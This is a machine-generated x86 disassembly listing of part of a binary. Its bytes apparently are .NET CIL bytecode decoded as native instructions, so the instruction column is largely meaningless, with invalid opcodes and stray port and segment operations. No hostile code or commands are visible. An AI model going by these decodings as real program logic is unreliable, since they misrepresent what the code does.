100050ea:	23 58 11             	and    0x11(%eax),%ebx
100050ed:	30 73 52             	xor    %dh,0x52(%ebx)
100050f0:	00 00                	add    %al,(%eax)
100050f2:	0a 6f 64             	or     0x64(%edi),%ch
100050f5:	00 00                	add    %al,(%eax)
100050f7:	0a 11                	or     (%ecx),%dl
100050f9:	34 7b                	xor    $0x7b,%al
100050fb:	32 00                	xor    (%eax),%al
100050fd:	00 04 20             	add    %al,(%eax,%eiz,1)
10005100:	e6 00                	out    %al,$0x0
10005102:	00 00                	add    %al,(%eax)
10005104:	20 e9                	and    %ch,%cl
10005106:	00 00                	add    %al,(%eax)
10005108:	00 20                	add    %ah,(%eax)
1000510a:	f0 00 00             	lock add %al,(%eax)
1000510d:	00 28                	add    %ch,(%eax)
1000510f:	39 00                	cmp    %eax,(%eax)
10005111:	00 0a                	add    %cl,(%edx)
10005113:	6f                   	outsl  %ds:(%esi),(%dx)
10005114:	3a 00                	cmp    (%eax),%al
10005116:	00 0a                	add    %cl,(%edx)
10005118:	7e 0e                	jle    0x10005128
1000511a:	00 00                	add    %al,(%eax)
1000511c:	04 6f                	add    $0x6f,%al
1000511e:	5d                   	pop    %ebp
1000511f:	00 00                	add    %al,(%eax)
10005121:	0a 11                	or     (%ecx),%dl
10005123:	34 7b                	xor    $0x7b,%al
10005125:	32 00                	xor    (%eax),%al
10005127:	00 04 6f             	add    %al,(%edi,%ebp,2)
1000512a:	5e                   	pop    %esi
1000512b:	00 00                	add    %al,(%eax)
1000512d:	0a 11                	or     (%ecx),%dl
1000512f:	34 73                	xor    $0x73,%al
10005131:	57                   	push   %edi
10005132:	00 00                	add    %al,(%eax)
10005134:	0a 7d 33             	or     0x33(%ebp),%bh
10005137:	00 00                	add    %al,(%eax)
10005139:	04 11                	add    $0x11,%al
1000513b:	34 7b                	xor    $0x7b,%al
1000513d:	33 00                	xor    (%eax),%eax
1000513f:	00 04 16             	add    %al,(%esi,%edx,1)
10005142:	1f                   	pop    %ds
10005143:	10 73 54             	adc    %dh,0x54(%ebx)
10005146:	00 00                	add    %al,(%eax)
10005148:	0a 6f 59             	or     0x59(%edi),%ch
1000514b:	00 00                	add    %al,(%eax)
1000514d:	0a 11                	or     (%ecx),%dl
1000514f:	34 7b                	xor    $0x7b,%al
10005151:	33 00                	xor    (%eax),%eax
10005153:	00 04 16             	add    %al,(%esi,%edx,1)
10005156:	16                   	push   %ss
10005157:	73 52                	jae    0x100051ab
10005159:	00 00                	add    %al,(%eax)
1000515b:	0a 6f 64             	or     0x64(%edi),%ch
1000515e:	00 00                	add    %al,(%eax)
10005160:	0a 11                	or     (%ecx),%dl
10005162:	34 7b                	xor    $0x7b,%al
10005164:	33 00                	xor    (%eax),%eax
10005166:	00 04 11             	add    %al,(%ecx,%edx,1)
10005169:	34 7b                	xor    $0x7b,%al
1000516b:	2a 00                	sub    (%eax),%al
1000516d:	00 04 6f             	add    %al,(%edi,%ebp,2)
10005170:	3a 00                	cmp    (%eax),%al
10005172:	00 0a                	add    %cl,(%edx)
10005174:	11 34 7b             	adc    %esi,(%ebx,%edi,2)
10005177:	32 00                	xor    (%eax),%al
10005179:	00 04 6f             	add    %al,(%edi,%ebp,2)
1000517c:	5d                   	pop    %ebp
1000517d:	00 00                	add    %al,(%eax)
1000517f:	0a 11                	or     (%ecx),%dl
10005181:	34 7b                	xor    $0x7b,%al
10005183:	33 00                	xor    (%eax),%eax
10005185:	00 04 6f             	add    %al,(%edi,%ebp,2)
10005188:	5e                   	pop    %esi
10005189:	00 00                	add    %al,(%eax)
1000518b:	0a 11                	or     (%ecx),%dl
1000518d:	34 73                	xor    $0x73,%al
1000518f:	58                   	pop    %eax
10005190:	00 00                	add    %al,(%eax)
10005192:	0a 7d 34             	or     0x34(%ebp),%bh
10005195:	00 00                	add    %al,(%eax)
10005197:	04 11                	add    $0x11,%al
10005199:	34 7b                	xor    $0x7b,%al
1000519b:	34 00                	xor    $0x0,%al
1000519d:	00 04 72             	add    %al,(%edx,%esi,2)
100051a0:	f6 0d 00 70 6f 35 00 	testb  $0x0,0x356f7000
100051a7:	00 0a                	add    %cl,(%edx)
100051a9:	11 34 7b             	adc    %esi,(%ebx,%edi,2)
100051ac:	34 00                	xor    $0x0,%al
100051ae:	00 04 72             	add    %al,(%edx,%esi,2)
100051b1:	35 02 00 70 22       	xor    $0x22700002,%eax
100051b6:	00 00                	add    %al,(%eax)
100051b8:	10 41 73             	adc    %al,0x73(%ecx)
100051bb:	60                   	pusha
100051bc:	00 00                	add    %al,(%eax)
100051be:	0a 6f 61             	or     0x61(%edi),%ch
100051c1:	00 00                	add    %al,(%eax)
100051c3:	0a 11                	or     (%ecx),%dl
100051c5:	34 7b                	xor    $0x7b,%al
100051c7:	34 00                	xor    $0x0,%al
100051c9:	00 04 11             	add    %al,(%ecx,%edx,1)
100051cc:	14 6f                	adc    $0x6f,%al
100051ce:	3c 00                	cmp    $0x0,%al
100051d0:	00 0a                	add    %cl,(%edx)
100051d2:	11 34 7b             	adc    %esi,(%ebx,%edi,2)
100051d5:	34 00                	xor    $0x0,%al
100051d7:	00 04 17             	add    %al,(%edi,%edx,1)
100051da:	6f                   	outsl  %ds:(%esi),(%dx)
100051db:	62 00                	bound  %eax,(%eax)
100051dd:	00 0a                	add    %cl,(%edx)
100051df:	11 34 7b             	adc    %esi,(%ebx,%edi,2)
100051e2:	34 00                	xor    $0x0,%al
100051e4:	00 04 11             	add    %al,(%ecx,%edx,1)
100051e7:	18 11                	sbb    %dl,(%ecx)
100051e9:	23 58 11             	and    0x11(%eax),%ebx
100051ec:	30 1f                	xor    %bl,(%edi)
100051ee:	16                   	push   %ss
100051ef:	58                   	pop    %eax
100051f0:	73 52                	jae    0x10005244
100051f2:	00 00                	add    %al,(%eax)
100051f4:	0a 6f 64             	or     0x64(%edi),%ch
100051f7:	00 00                	add    %al,(%eax)
100051f9:	0a 11                	or     (%ecx),%dl
100051fb:	34 7b                	xor    $0x7b,%al
100051fd:	34 00                	xor    $0x0,%al
100051ff:	00 04 28             	add    %al,(%eax,%ebp,1)
10005202:	5a                   	pop    %edx
10005203:	00 00                	add    %al,(%eax)
10005205:	0a 6f 3a             	or     0x3a(%edi),%ch
10005208:	00 00                	add    %al,(%eax)
1000520a:	0a 7e 0e             	or     0xe(%esi),%bh
1000520d:	00 00                	add    %al,(%eax)
1000520f:	04 6f                	add    $0x6f,%al
10005211:	5d                   	pop    %ebp
10005212:	00 00                	add    %al,(%eax)
10005214:	0a 11                	or     (%ecx),%dl
10005216:	34 7b                	xor    $0x7b,%al
10005218:	34 00                	xor    $0x0,%al
1000521a:	00 04 6f             	add    %al,(%edi,%ebp,2)
1000521d:	5e                   	pop    %esi
1000521e:	00 00                	add    %al,(%eax)
10005220:	0a 73 57             	or     0x57(%ebx),%dh
10005223:	00 00                	add    %al,(%eax)
10005225:	0a 13                	or     (%ebx),%dl
10005227:	31 11                	xor    %edx,(%ecx)
10005229:	31 11                	xor    %edx,(%ecx)
1000522b:	24 1f                	and    $0x1f,%al
1000522d:	50                   	push   %eax
1000522e:	73 54                	jae    0x10005284
10005230:	00 00                	add    %al,(%eax)
10005232:	0a 6f 59             	or     0x59(%edi),%ch
10005235:	00 00                	add    %al,(%eax)
10005237:	0a 11                	or     (%ecx),%dl
10005239:	31 11                	xor    %edx,(%ecx)
1000523b:	18 11                	sbb    %dl,(%ecx)
1000523d:	23 58 11             	and    0x11(%eax),%ebx
10005240:	30 1f                	xor    %bl,(%edi)
10005242:	32 58 73             	xor    0x73(%eax),%bl
10005245:	52                   	push   %edx
10005246:	00 00                	add    %al,(%eax)
10005248:	0a 6f 64             	or     0x64(%edi),%ch
1000524b:	00 00                	add    %al,(%eax)
1000524d:	0a 11                	or     (%ecx),%dl
1000524f:	31 1f                	xor    %ebx,(%edi)
10005251:	14 1f                	adc    $0x1f,%al
10005253:	14 1f                	adc    $0x1f,%al
10005255:	19 28                	sbb    %ebp,(%eax)
10005257:	39 00                	cmp    %eax,(%eax)
10005259:	00 0a                	add    %cl,(%edx)
1000525b:	6f                   	outsl  %ds:(%esi),(%dx)
1000525c:	3a 00                	cmp    (%eax),%al
1000525e:	00 0a                	add    %cl,(%edx)
10005260:	11 31                	adc    %esi,(%ecx)
10005262:	17                   	pop    %ss
10005263:	6f                   	outsl  %ds:(%esi),(%dx)
10005264:	70 00                	jo     0x10005266
10005266:	00 0a                	add    %cl,(%edx)
10005268:	7e 0e                	jle    0x10005278
1000526a:	00 00                	add    %al,(%eax)
1000526c:	04 6f                	add    $0x6f,%al
1000526e:	5d                   	pop    %ebp
1000526f:	00 00                	add    %al,(%eax)
10005271:	0a 11                	or     (%ecx),%dl
10005273:	31 6f 5e             	xor    %ebp,0x5e(%edi)
10005276:	00 00                	add    %al,(%eax)
10005278:	0a 73 58             	or     0x58(%ebx),%dh
1000527b:	00 00                	add    %al,(%eax)
1000527d:	0a 13                	or     (%ebx),%dl
1000527f:	32 11                	xor    (%ecx),%dl
10005281:	32 72 4a             	xor    0x4a(%edx),%dh
10005284:	0e                   	push   %cs
10005285:	00 70 6f             	add    %dh,0x6f(%eax)
10005288:	35 00 00 0a 11       	xor    $0x110a0000,%eax
1000528d:	32 72 f2             	xor    -0xe(%edx),%dh
10005290:	03 00                	add    (%eax),%eax
10005292:	70 22                	jo     0x100052b6
10005294:	00 00                	add    %al,(%eax)
10005296:	00 41 73             	add    %al,0x73(%ecx)
10005299:	60                   	pusha
1000529a:	00 00                	add    %al,(%eax)
1000529c:	0a 6f 61             	or     0x61(%edi),%ch
1000529f:	00 00                	add    %al,(%eax)
100052a1:	0a 11                	or     (%ecx),%dl
100052a3:	32 1f                	xor    (%edi),%bl
100052a5:	64 20 ff             	fs and %bh,%bh
100052a8:	00 00                	add    %al,(%eax)
100052aa:	00 1f                	add    %bl,(%edi)
100052ac:	64 28 39             	sub    %bh,%fs:(%ecx)
100052af:	00 00                	add    %al,(%eax)
100052b1:	0a 6f 3c             	or     0x3c(%edi),%ch
100052b4:	00 00                	add    %al,(%eax)
100052b6:	0a 11                	or     (%ecx),%dl
100052b8:	32 17                	xor    (%edi),%dl
100052ba:	6f                   	outsl  %ds:(%esi),(%dx)
100052bb:	62 00                	bound  %eax,(%eax)
100052bd:	00 0a                	add    %cl,(%edx)
100052bf:	11 32                	adc    %esi,(%edx)
100052c1:	1b 19                	sbb    (%ecx),%ebx
100052c3:	73 52                	jae    0x10005317
100052c5:	00 00                	add    %al,(%eax)
100052c7:	0a 6f 64             	or     0x64(%edi),%ch
100052ca:	00 00                	add    %al,(%eax)
100052cc:	0a 11                	or     (%ecx),%dl
100052ce:	32 28                	xor    (%eax),%ch
100052d0:	5a                   	pop    %edx
100052d1:	00 00                	add    %al,(%eax)
100052d3:	0a 6f 3a             	or     0x3a(%edi),%ch
100052d6:	00 00                	add    %al,(%eax)
100052d8:	0a 11                	or     (%ecx),%dl
100052da:	31 6f 5d             	xor    %ebp,0x5d(%edi)
100052dd:	00 00                	add    %al,(%eax)
100052df:	0a 11                	or     (%ecx),%dl
100052e1:	32 6f 5e             	xor    0x5e(%edi),%ch
100052e4:	00 00                	add    %al,(%eax)
100052e6:	0a 11                	or     (%ecx),%dl
100052e8:	34 73                	xor    $0x73,%al
100052ea:	58                   	pop    %eax
100052eb:	00 00                	add    %al,(%eax)
100052ed:	0a 7d 35             	or     0x35(%ebp),%bh
100052f0:	00 00                	add    %al,(%eax)
100052f2:	04 11                	add    $0x11,%al
100052f4:	34 7b                	xor    $0x7b,%al
100052f6:	35 00 00 04 1d       	xor    $0x1d040000,%eax
100052fb:	8d 11                	lea    (%ecx),%edx
100052fd:	00 00                	add    %al,(%eax)
100052ff:	01 13                	add    %edx,(%ebx)
10005301:	3b 11                	cmp    (%ecx),%edx
10005303:	3b 16                	cmp    (%esi),%edx
10005305:	72 89                	jb     0x10005290
10005307:	00 00                	add    %al,(%eax)
10005309:	70 a2                	jo     0x100052ad
1000530b:	11 3b                	adc    %edi,(%ebx)
1000530d:	17                   	pop    %ss
1000530e:	28 3e                	sub    %bh,(%esi)
10005310:	00 00                	add    %al,(%eax)
10005312:	0a 13                	or     (%ebx),%dl
10005314:	3e 12 3e             	adc    %ds:(%esi),%bh
10005317:	72 79                	jb     0x10005392
10005319:	01 00                	add    %eax,(%eax)
1000531b:	70 28                	jo     0x10005345
1000531d:	3f                   	aas
1000531e:	00 00                	add    %al,(%eax)
10005320:	0a a2 11 3b 18 72    	or     0x72183b11(%edx),%ah
10005326:	6c                   	insb   (%dx),%es:(%edi)
10005327:	0e                   	push   %cs
10005328:	00 70 a2             	add    %dh,-0x5e(%eax)
1000532b:	11 3b                	adc    %edi,(%ebx)
1000532d:	19 28                	sbb    %ebp,(%eax)
1000532f:	3e 00 00             	add    %al,%ds:(%eax)
10005332:	0a 13                	or     (%ebx),%dl
10005334:	3e 12 3e             	adc    %ds:(%esi),%bh
10005337:	72 79                	jb     0x100053b2
10005339:	01 00                	add    %eax,(%eax)
1000533b:	70 28                	jo     0x10005365
1000533d:	3f                   	aas
1000533e:	00 00                	add    %al,(%eax)
10005340:	0a a2 11 3b 1a 72    	or     0x721a3b11(%edx),%ah
10005346:	be 0e 00 70 a2       	mov    $0xa270000e,%esi
1000534b:	11 3b                	adc    %edi,(%ebx)
1000534d:	1b 11                	sbb    (%ecx),%edx
1000534f:	12 6f 1c             	adc    0x1c(%edi),%ch
10005352:	00 00                	add    %al,(%eax)
10005354:	0a a2 11 3b 1c 72    	or     0x721c3b11(%edx),%ah
1000535a:	f2 0e                	repnz push %cs
1000535c:	00 70 a2             	add    %dh,-0x5e(%eax)
1000535f:	11 3b                	adc    %edi,(%ebx)
10005361:	28 43 00             	sub    %al,0x0(%ebx)
10005364:	00 0a                	add    %cl,(%edx)
10005366:	6f                   	outsl  %ds:(%esi),(%dx)
10005367:	35 00 00 0a 11       	xor    $0x110a0000,%eax
1000536c:	34 7b                	xor    $0x7b,%al
1000536e:	35 00 00 04 72       	xor    $0x72040000,%eax
10005373:	f2 03 00             	repnz add (%eax),%eax
10005376:	70 22                	jo     0x1000539a
10005378:	00 00                	add    %al,(%eax)
1000537a:	e0 40                	loopne 0x100053bc
1000537c:	73 60                	jae    0x100053de
1000537e:	00 00                	add    %al,(%eax)
10005380:	0a 6f 61             	or     0x61(%edi),%ch
10005383:	00 00                	add    %al,(%eax)
10005385:	0a 11                	or     (%ecx),%dl
10005387:	34 7b                	xor    $0x7b,%al
10005389:	35 00 00 04 20       	xor    $0x20040000,%eax
1000538e:	b4 00                	mov    $0x0,%ah
10005390:	00 00                	add    %al,(%eax)
10005392:	20 b4 00 00 00 20 b4 	and    %dh,-0x4be00000(%eax,%eax,1)
10005399:	00 00                	add    %al,(%eax)
1000539b:	00 28                	add    %ch,(%eax)
1000539d:	39 00                	cmp    %eax,(%eax)
1000539f:	00 0a                	add    %cl,(%edx)
100053a1:	6f                   	outsl  %ds:(%esi),(%dx)
100053a2:	3c 00                	cmp    $0x0,%al
100053a4:	00 0a                	add    %cl,(%edx)
100053a6:	11 34 7b             	adc    %esi,(%ebx,%edi,2)
100053a9:	35 00 00 04 16       	xor    $0x16040000,%eax
100053ae:	6f                   	outsl  %ds:(%esi),(%dx)
100053af:	62 00                	bound  %eax,(%eax)
100053b1:	00 0a                	add    %cl,(%edx)
100053b3:	11 34 7b             	adc    %esi,(%ebx,%edi,2)
100053b6:	35 00 00 04 11       	xor    $0x11040000,%eax
100053bb:	24 1f                	and    $0x1f,%al
100053bd:	0f 59 1f             	mulps  (%edi),%xmm3
100053c0:	37                   	aaa
100053c1:	73 54                	jae    0x10005417
100053c3:	00 00                	add    %al,(%eax)
100053c5:	0a 6f 59             	or     0x59(%edi),%ch
100053c8:	00 00                	add    %al,(%eax)
100053ca:	0a 11                	or     (%ecx),%dl
100053cc:	34 7b                	xor    $0x7b,%al
100053ce:	35 00 00 04 1b       	xor    $0x1b040000,%eax
100053d3:	1f                   	pop    %ds
100053d4:	14 73                	adc    $0x73,%al
100053d6:	52                   	push   %edx
100053d7:	00 00                	add    %al,(%eax)
100053d9:	0a 6f 64             	or     0x64(%edi),%ch
100053dc:	00 00                	add    %al,(%eax)
100053de:	0a 11                	or     (%ecx),%dl
100053e0:	34 7b                	xor    $0x7b,%al
100053e2:	35 00 00 04 28       	xor    $0x28040000,%eax
100053e7:	5a                   	pop    %edx
100053e8:	00 00                	add    %al,(%eax)
100053ea:	0a 6f 3a             	or     0x3a(%edi),%ch
100053ed:	00 00                	add    %al,(%eax)
100053ef:	0a 11                	or     (%ecx),%dl
100053f1:	31 6f 5d             	xor    %ebp,0x5d(%edi)
100053f4:	00 00                	add    %al,(%eax)
100053f6:	0a 11                	or     (%ecx),%dl
100053f8:	34 7b                	xor    $0x7b,%al
100053fa:	35 00 00 04 6f       	xor    $0x6f040000,%eax
100053ff:	5e                   	pop    %esi
10005400:	00 00                	add    %al,(%eax)
10005402:	0a 11                	or     (%ecx),%dl
10005404:	34 1a                	xor    $0x1a,%al
10005406:	8d 15 00 00 01 13    	lea    0x13010000,%edx
1000540c:	3f                   	aas
1000540d:	11 3f                	adc    %edi,(%edi)
1000540f:	7d 36                	jge    0x10005447
10005411:	00 00                	add    %al,(%eax)
10005413:	04 11                	add    $0x11,%al
10005415:	34 16                	xor    $0x16,%al
10005417:	7d 37                	jge    0x10005450
10005419:	00 00                	add    %al,(%eax)
1000541b:	04 11                	add    $0x11,%al
1000541d:	34 16                	xor    $0x16,%al
1000541f:	7d 38                	jge    0x10005459
10005421:	00 00                	add    %al,(%eax)
10005423:	04 11                	add    $0x11,%al
10005425:	34 1f                	xor    $0x1f,%al
10005427:	0a 8d 11 00 00 01    	or     0x1000011(%ebp),%cl
1000542d:	13 3b                	adc    (%ebx),%edi
1000542f:	11 3b                	adc    %edi,(%ebx)
10005431:	16                   	push   %ss
10005432:	72 08                	jb     0x1000543c
10005434:	0f 00                	(bad)
10005436:	70 a2                	jo     0x100053da
10005438:	11 3b                	adc    %edi,(%ebx)
1000543a:	17                   	pop    %ss
1000543b:	72 58                	jb     0x10005495
1000543d:	0f 00                	(bad)
1000543f:	70 a2                	jo     0x100053e3
10005441:	11 3b                	adc    %edi,(%ebx)
10005443:	18 72 a4             	sbb    %dh,-0x5c(%edx)
10005446:	0f 00                	(bad)
10005448:	70 11                	jo     0x1000545b
1000544a:	12 72 d8             	adc    -0x28(%edx),%dh
1000544d:	0f 00                	(bad)
1000544f:	70 28                	jo     0x10005479
10005451:	44                   	inc    %esp
10005452:	00 00                	add    %al,(%eax)
10005454:	0a a2 11 3b 19 72    	or     0x72193b11(%edx),%ah
1000545a:	e0 0f                	loopne 0x1000546b
1000545c:	00 70 a2             	add    %dh,-0x5e(%eax)
1000545f:	11 3b                	adc    %edi,(%ebx)
10005461:	1a 72 a4             	sbb    -0x5c(%edx),%dh
10005464:	0c 00                	or     $0x0,%al
10005466:	70 a2                	jo     0x1000540a
10005468:	11 3b                	adc    %edi,(%ebx)
1000546a:	1b 72 12             	sbb    0x12(%edx),%esi
1000546d:	10 00                	adc    %al,(%eax)
1000546f:	70 a2                	jo     0x10005413
10005471:	11 3b                	adc    %edi,(%ebx)
10005473:	1c 72                	sbb    $0x72,%al
10005475:	5a                   	pop    %edx
10005476:	10 00                	adc    %al,(%eax)
10005478:	70 a2                	jo     0x1000541c
1000547a:	11 3b                	adc    %edi,(%ebx)
1000547c:	1d 72 90 10 00       	sbb    $0x109072,%eax
10005481:	70 a2                	jo     0x10005425
10005483:	11 3b                	adc    %edi,(%ebx)
10005485:	1e                   	push   %ds
10005486:	72 e0                	jb     0x10005468
10005488:	10 00                	adc    %al,(%eax)
1000548a:	70 a2                	jo     0x1000542e
1000548c:	11 3b                	adc    %edi,(%ebx)
1000548e:	1f                   	pop    %ds
1000548f:	09 72 2c             	or     %esi,0x2c(%edx)
10005492:	11 00                	adc    %eax,(%eax)
10005494:	70 a2                	jo     0x10005438
10005496:	11 3b                	adc    %edi,(%ebx)
10005498:	7d 39                	jge    0x100054d3
1000549a:	00 00                	add    %al,(%eax)
1000549c:	04 73                	add    $0x73,%al
1000549e:	69 00 00 0a 13 33    	imul   $0x33130a00,(%eax),%eax
100054a4:	11 33                	adc    %esi,(%ebx)
100054a6:	1f                   	pop    %ds
100054a7:	23 6f 6a             	and    0x6a(%edi),%ebp
100054aa:	00 00                	add    %al,(%eax)
100054ac:	0a 11                	or     (%ecx),%dl
100054ae:	33 11                	xor    (%ecx),%edx
100054b0:	34 fe                	xor    $0xfe,%al
100054b2:	06                   	push   %es
100054b3:	48                   	dec    %eax
100054b4:	00 00                	add    %al,(%eax)
100054b6:	06                   	push   %es
100054b7:	73 6b                	jae    0x10005524
100054b9:	00 00                	add    %al,(%eax)
100054bb:	0a 6f 6c             	or     0x6c(%edi),%ch
100054be:	00 00                	add    %al,(%eax)
100054c0:	0a 11                	or     (%ecx),%dl
100054c2:	33 6f 6d             	xor    0x6d(%edi),%ebp
100054c5:	00 00                	add    %al,(%eax)
100054c7:	0a 7e 0e             	or     0xe(%esi),%bh
100054ca:	00 00                	add    %al,(%eax)
100054cc:	04 11                	add    $0x11,%al
100054ce:	38 fe                	cmp    %bh,%dh
100054d0:	06                   	push   %es
100054d1:	43                   	inc    %ebx
100054d2:	00 00                	add    %al,(%eax)
100054d4:	06                   	push   %es
100054d5:	73 6b                	jae    0x10005542
100054d7:	00 00                	add    %al,(%eax)
100054d9:	0a 6f 72             	or     0x72(%edi),%ch
100054dc:	00 00                	add    %al,(%eax)
100054de:	0a 7e 0e             	or     0xe(%esi),%bh
100054e1:	00 00                	add    %al,(%eax)
100054e3:	04 7e                	add    $0x7e,%al
100054e5:	14 00                	adc    $0x0,%al
100054e7:	00 04 2d 11 14 fe 06 	add    %al,0x6fe1411(,%ebp,1)
100054ee:	3c 00                	cmp    $0x0,%al
100054f0:	00 06                	add    %al,(%esi)
100054f2:	73 73                	jae    0x10005567
100054f4:	00 00                	add    %al,(%eax)
100054f6:	0a 80 14 00 00 04    	or     0x4000014(%eax),%al
100054fc:	7e 14                	jle    0x10005512
100054fe:	00 00                	add    %al,(%eax)
10005500:	04 6f                	add    $0x6f,%al
10005502:	74 00                	je     0x10005504
10005504:	00 0a                	add    %cl,(%edx)
10005506:	73 69                	jae    0x10005571
10005508:	00 00                	add    %al,(%eax)
1000550a:	0a 13                	or     (%ebx),%dl
1000550c:	35 11 35 1f 32       	xor    $0x321f3511,%eax
10005511:	6f                   	outsl  %ds:(%esi),(%dx)
10005512:	6a 00                	push   $0x0
10005514:	00 0a                	add    %cl,(%edx)
10005516:	11 38                	adc    %edi,(%eax)
10005518:	16                   	push   %ss
10005519:	7d 1e                	jge    0x10005539
1000551b:	00 00                	add    %al,(%eax)
1000551d:	04 11                	add    $0x11,%al
1000551f:	38 20                	cmp    %ah,(%eax)
10005521:	d0 02                	rolb   $1,(%edx)
10005523:	00 00                	add    %al,(%eax)
10005525:	7d 1f                	jge    0x10005546
10005527:	00 00                	add    %al,(%eax)
10005529:	04 11                	add    $0x11,%al
1000552b:	35 11 38 fe 06       	xor    $0x6fe3811,%eax
10005530:	44                   	inc    %esp
10005531:	00 00                	add    %al,(%eax)
10005533:	06                   	push   %es
10005534:	73 6b                	jae    0x100055a1
10005536:	00 00                	add    %al,(%eax)
10005538:	0a 6f 6c             	or     0x6c(%edi),%ch
1000553b:	00 00                	add    %al,(%eax)
1000553d:	0a 11                	or     (%ecx),%dl
1000553f:	35 6f 6d 00 00       	xor    $0x6d6f,%eax
10005544:	0a 7e 0e             	or     0xe(%esi),%bh
10005547:	00 00                	add    %al,(%eax)
10005549:	04 7e                	add    $0x7e,%al
1000554b:	15 00 00 04 2d       	adc    $0x2d040000,%eax
10005550:	11 14 fe             	adc    %edx,(%esi,%edi,8)
10005553:	06                   	push   %es
10005554:	3d 00 00 06 73       	cmp    $0x73060000,%eax
10005559:	6b 00 00             	imul   $0x0,(%eax),%eax
1000555c:	0a 80 15 00 00 04    	or     0x4000015(%eax),%al
10005562:	7e 15                	jle    0x10005579
10005564:	00 00                	add    %al,(%eax)
10005566:	04 6f                	add    $0x6f,%al
10005568:	75 00                	jne    0x1000556a
1000556a:	00 0a                	add    %cl,(%edx)
1000556c:	7e 0e                	jle    0x1000557c
1000556e:	00 00                	add    %al,(%eax)
10005570:	04 28                	add    $0x28,%al
10005572:	76 00                	jbe    0x10005574
10005574:	00 0a                	add    %cl,(%edx)
10005576:	de 03                	fiadds (%ebx)
10005578:	26 de 00             	fiadds %es:(%eax)
1000557b:	de 0f                	fimuls (%edi)
1000557d:	16                   	push   %ss
1000557e:	fe                   	(bad)
1000557f:	13 80 10 00 00 04    	adc    0x4000010(%eax),%eax
10005585:	14 80                	adc    $0x80,%al
10005587:	0e                   	push   %cs
10005588:	00 00                	add    %al,(%eax)
1000558a:	04 dc                	add    $0xdc,%al
1000558c:	2a 00                	sub    (%eax),%al
1000558e:	00 00                	add    %al,(%eax)
10005590:	41                   	inc    %ecx
10005591:	34 00                	xor    $0x0,%al
	...
1000559b:	00 84 1d 00 00 84 1d 	add    %al,0x1d840000(%ebp,%ebx,1)
100055a2:	00 00                	add    %al,(%eax)
100055a4:	03 00                	add    (%eax),%eax
100055a6:	00 00                	add    %al,(%eax)
100055a8:	01 00                	add    %eax,(%eax)
100055aa:	00 01                	add    %al,(%ecx)
100055ac:	02 00                	add    (%eax),%al
100055ae:	00 00                	add    %al,(%eax)
100055b0:	00 00                	add    %al,(%eax)
100055b2:	00 00                	add    %al,(%eax)
100055b4:	89 1d 00 00 89 1d    	mov    %ebx,0x1d890000
100055ba:	00 00                	add    %al,(%eax)
100055bc:	0f 00 00             	sldt   (%eax)
100055bf:	00 00                	add    %al,(%eax)
100055c1:	00 00                	add    %al,(%eax)
100055c3:	00 03                	add    %al,(%ebx)
100055c5:	30 02                	xor    %al,(%edx)
100055c7:	00 7a 00             	add    %bh,0x0(%edx)
100055ca:	00 00                	add    %al,(%eax)
100055cc:	00 00                	add    %al,(%eax)
100055ce:	00 00                	add    %al,(%eax)
100055d0:	fe                   	(bad)
100055d1:	13 7e 10             	adc    0x10(%esi),%edi
100055d4:	00 00                	add    %al,(%eax)
100055d6:	04 2c                	add    $0x2c,%al
100055d8:	0c 28                	or     $0x28,%al
100055da:	39 00                	cmp    %eax,(%eax)
100055dc:	00 06                	add    %al,(%esi)
100055de:	1f                   	pop    %ds
100055df:	1e                   	push   %ds
100055e0:	28 1a                	sub    %bl,(%edx)
100055e2:	00 00                	add    %al,(%eax)
100055e4:	0a 16                	or     (%esi),%dl
100055e6:	fe                   	(bad)
100055e7:	13 80 11 00 00 04    	adc    0x4000011(%eax),%eax
100055ed:	17                   	pop    %ss
100055ee:	fe                   	(bad)
100055ef:	13 80 10 00 00 04    	adc    0x4000010(%eax),%eax
100055f5:	02 80 12 00 00 04    	add    0x4000012(%eax),%al
100055fb:	7e 13                	jle    0x10005610
100055fd:	00 00                	add    %al,(%eax)
100055ff:	04 2d                	add    $0x2d,%al
10005601:	11 14 fe             	adc    %edx,(%esi,%edi,8)
10005604:	06                   	push   %es
10005605:	3b 00                	cmp    (%eax),%eax
10005607:	00 06                	add    %al,(%esi)
10005609:	73 0e                	jae    0x10005619
1000560b:	00 00                	add    %al,(%eax)
1000560d:	0a 80 13 00 00 04    	or     0x4000013(%eax),%al
10005613:	7e 13                	jle    0x10005628
10005615:	00 00                	add    %al,(%eax)
10005617:	04 73                	add    $0x73,%al
10005619:	0f 00 00             	sldt   (%eax)
1000561c:	0a 80 0f 00 00 04    	or     0x400000f(%eax),%al
10005622:	7e 0f                	jle    0x10005633
10005624:	00 00                	add    %al,(%eax)
10005626:	04 16                	add    $0x16,%al
10005628:	6f                   	outsl  %ds:(%esi),(%dx)
10005629:	77 00                	ja     0x1000562b
1000562b:	00 0a                	add    %cl,(%edx)
1000562d:	7e 0f                	jle    0x1000563e
1000562f:	00 00                	add    %al,(%eax)
10005631:	04 17                	add    $0x17,%al
10005633:	6f                   	outsl  %ds:(%esi),(%dx)
10005634:	10 00                	adc    %al,(%eax)
10005636:	00 0a                	add    %cl,(%edx)
10005638:	7e 0f                	jle    0x10005649
1000563a:	00 00                	add    %al,(%eax)
1000563c:	04 6f                	add    $0x6f,%al
1000563e:	12 00                	adc    (%eax),%al
10005640:	00 0a                	add    %cl,(%edx)
10005642:	1f                   	pop    %ds
10005643:	1e                   	push   %ds
10005644:	28 1a                	sub    %bl,(%edx)
10005646:	00 00                	add    %al,(%eax)
10005648:	0a 2a                	or     (%edx),%ch
1000564a:	00 00                	add    %al,(%eax)
1000564c:	0b 30                	or     (%eax),%esi
1000564e:	01 00                	add    %eax,(%eax)
10005650:	15 00 00 00 00       	adc    $0x0,%eax
10005655:	00 00                	add    %al,(%eax)
10005657:	00 28                	add    %ch,(%eax)
10005659:	78 00                	js     0x1000565b
1000565b:	00 0a                	add    %cl,(%edx)
1000565d:	7e 0e                	jle    0x1000566d
1000565f:	00 00                	add    %al,(%eax)
10005661:	04 6f                	add    $0x6f,%al
10005663:	79 00                	jns    0x10005665
10005665:	00 0a                	add    %cl,(%edx)
10005667:	de 03                	fiadds (%ebx)
10005669:	26 de 00             	fiadds %es:(%eax)
1000566c:	2a 00                	sub    (%eax),%al
1000566e:	00 00                	add    %al,(%eax)
10005670:	01 10                	add    %edx,(%eax)
10005672:	00 00                	add    %al,(%eax)
10005674:	00 00                	add    %al,(%eax)
10005676:	00 00                	add    %al,(%eax)
10005678:	11 11                	adc    %edx,(%ecx)
1000567a:	00 03                	add    %al,(%ebx)
1000567c:	01 00                	add    %eax,(%eax)
1000567e:	00 01                	add    %al,(%ecx)
10005680:	0b 30                	or     (%eax),%esi
